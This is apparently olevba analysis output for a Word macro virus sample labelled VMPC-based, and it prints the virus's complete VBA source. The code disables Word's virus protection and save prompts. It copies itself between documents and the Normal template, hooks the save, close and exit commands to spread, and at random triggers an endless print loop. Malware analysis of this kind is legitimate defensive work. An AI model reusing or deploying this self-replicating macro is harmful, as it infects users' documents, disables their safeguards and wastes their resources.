olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-cfdd5cc0912568781f103af9e102e666444452eb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-cfdd5cc0912568781f103af9e102e666444452eb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO pomplastic.bas 
in file: Virus.MSWord.VMPC-based-cfdd5cc0912568781f103af9e102e666444452eb - OLE stream: 'Macros/VBA/pomplastic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'TTAGCCTCGGAGATCATTTAGCCATGGGACAAATATAGGATCATCATCTTTCCGCCGTCCGTCCCGTAC
Sub pomplastic()
'TTAGCCTCGGAGATCATTTAGCCATGGGACAAATATAGGATCATCATCTTTCCGCCGTCCGTCCCGTAC
On Error Resume Next
Randomize
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
'TTAGCCTCGGAGATCATTTAGCCATGGGACAAATATAGGATCATCATCTTTCCGCCGTCCGTCCCGTAC
End With
ActiveDocument.ReadOnlyRecommended = False
check = Int(Rnd * 100)
If check = 3 Then Call Plaserickidot
wumpgater = 0
'TTAGCCTCGGAGATCATTTAGCCATGGGACAAATATAGGATCATCATCTTTCCGCCGTCCGTCCCGTAC
'TTAGCCTCGGAGATCATTTAGCCATGAGATCATTTAGCCATGGGACAAACCTCGGAGATCATTTAGC
Set this14you = MacroContainer
If this14you = NormalTemplate Then wumpgater = 1
If wumpgater = 1 Then ZZZlidetaherZZ = NormalTemplate.FullName Else ZZZlidetaherZZ = ActiveDocument.FullName
If wumpgater = 1 Then lastrites12345abc = ActiveDocument.FullName Else lastrites12345abc = NormalTemplate.FullName
Application.OrganizerCopy Source:=ZZZlidetaherZZ, Destination:=lastrites12345abc, Name:="pomplastic", Object:=wdOrganizerObjectProjectItems
If wumpgater = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If wumpgater = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
pumkinjuice:
End Sub
'TTAGCCTCGGAGATCATTTAGCCATGAGATCATTTAGCCATGGGACAAACCTCGGAGATCATTTAGC
Sub FileSave()
    On Error Resume Next
    Call pomplastic
    ActiveDocument.Save
End Sub
'TTAGCCTCGGAGATCATTTAGCCATGGGACAAATATAGGATCATCATCTTTCCGCCGTCCGTCCCGTAC
Sub FileClose()
Attribute FileClose.VB_Description = "Macro created 01/01/97 by Goppecker"
Attribute FileClose.VB_ProcData.VB_Invoke_Func = "Project.pomplastic.FileClose"
    On Error Resume Next
    Call pomplastic
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call pomplastic
End Sub
Sub FileExit()
    On Error Resume Next
    Call pomplastic
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub Plaserickidot()
    On Error Resume Next
    ActiveDocument.PrintOut
    Call Plaserickidot
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

